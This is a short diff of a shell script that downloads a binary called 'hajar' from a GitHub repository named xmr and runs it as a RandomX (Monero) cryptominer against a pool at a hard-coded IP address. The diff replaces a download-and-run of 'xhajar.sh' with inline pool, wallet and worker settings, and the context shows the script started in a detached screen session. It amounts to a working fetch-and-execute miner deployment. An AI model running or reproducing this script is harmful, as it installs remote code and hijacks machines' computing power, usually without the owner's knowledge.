@@ -8,8 +8,12 @@ screen -dmS xhajar.sh ./xhajar.sh 65 75
 
 wget https://github.com/renilo/xmr/raw/main/hajar
 
-wget https://raw.githubusercontent.com/renilo/xmr/main/xhajar.sh
+POOL=208.113.200.73:443
 
-chmod +x xhajar.sh
+WALLET=THISPC
 
-./xhajar.sh
+WORKER=$(echo $(shuf -i 1-10000 -n 1)-GPU)
+
+chmod +x hajar
+
+./hajar --disable-gpu --algorithm randomx --pool $POOL --wallet $WALLET.$WORKER
